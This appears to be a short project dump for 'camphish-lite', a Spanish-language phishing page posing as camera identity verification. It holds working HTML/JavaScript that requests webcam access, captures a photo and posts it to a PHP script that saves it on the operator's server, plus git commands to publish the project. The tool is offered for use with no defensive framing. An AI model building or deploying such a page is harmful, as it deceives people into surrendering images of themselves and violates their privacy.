# campish-litemkdir camphish-lite
cd camphish-lite
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Verificación de identidad</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
    video, canvas { width: 300px; border-radius: 10px; margin: 10px 0; }
    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
  </style>
</head>
<body>

  <h2>Verificación de cámara</h2>
  <p>Por favor, permite el acceso a tu cámara para continuar.</p>
  <video id="video" autoplay></video><br>
  <button onclick="capture()">Capturar</button>

  <canvas id="canvas" style="display: none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
      })
      .catch(err => {
        alert("Error al acceder a la cámara: " + err);
      });

    function capture() {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageData = canvas.toDataURL('image/jpeg');

      fetch('upload.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: imageData })
      })
      .then(res => alert("Imagen enviada"))
      .catch(err => alert("Error al enviar: " + err));
    }
  </script>

</body>
</html>
<?php
$data = json_decode(file_get_contents('php://input'), true);
if (!isset($data['image'])) {
    http_response_code(400);
    exit("No se recibió imagen");
}

$image = $data['image'];
$image = str_replace('data:image/jpeg;base64,', '', $image);
$image = base64_decode($image);

$filename = 'captured/image.jpg';
file_put_contents($filename, $image);
echo "OK";
?>
git add index.html upload.php start_camphish.sh
git commit -m "Primer commit: Archivos iniciales"
git remote add origin https://github.com/TU_USUARIO/camphish-lite.git
git push -u origin master
